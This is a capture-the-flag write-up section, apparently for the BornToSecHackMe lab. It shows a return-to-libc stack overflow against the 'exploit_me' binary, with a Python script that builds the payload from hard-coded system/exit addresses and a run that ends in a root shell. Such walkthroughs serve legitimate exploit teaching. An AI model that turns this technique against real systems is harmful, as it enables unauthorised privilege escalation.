### Bonus Ret2Libc

This method requires the access to the user zaz which steps are described in the writeup1.

There's another way to exploit the `exploit_me` which is to point to a libc function (eg. system) instead of pointing to a shellcode.

In order to do that, we first need to find 3 addresses :
- The address of a libc function that we want to call, we'll choose `system`.
- The address of `exit` function which is kind of optional, you can a bad address but it'll be noticed because the exit status will indicate that the program has segfaulted after leaving system.
- The address of our argument which is a string containing "/bin/bash -p".

To retrieve `system` and `exit`, we'll just use gdb and print the addresses. Now, for the address of our argument we could send it by adding another command argument since it only checks that `argc > 1`. However, we're lazy and we'll just send it at the end of our payload and send the address of our buffer + 140 + 4 * 3.

So our payload should look like this :
```
PADDING + ADDR_SYSTEM + ADDR_EXIT + ADDR_COMMAND + COMMAND
```

The script that allows us to generate the payload :
```py
import struct

system_addr = struct.pack('<I', 0xb7e6b060)
exit_addr = struct.pack('<I', 0xb7e5ebe0)
libc_addr = struct.pack('<I', 0xb7e2c000)
command_addr = struct.pack('<I', 0xbffff640 + 140 + 4 * 3)
command = b"/bin/bash -p \x00"
payload = 140 * b"\x90" + system_addr + exit_addr + command_addr + command
with open("payload", "wb") as f :
    f.write(payload)
```

The command same as before :
```text
zaz@BornToSecHackMe:~$ ./exploit_me "$(cat payload)"
��������������������������������������������������������������������������������������������������������������������������������������������`���������/bin/bash -p 
bash-4.2# exit
```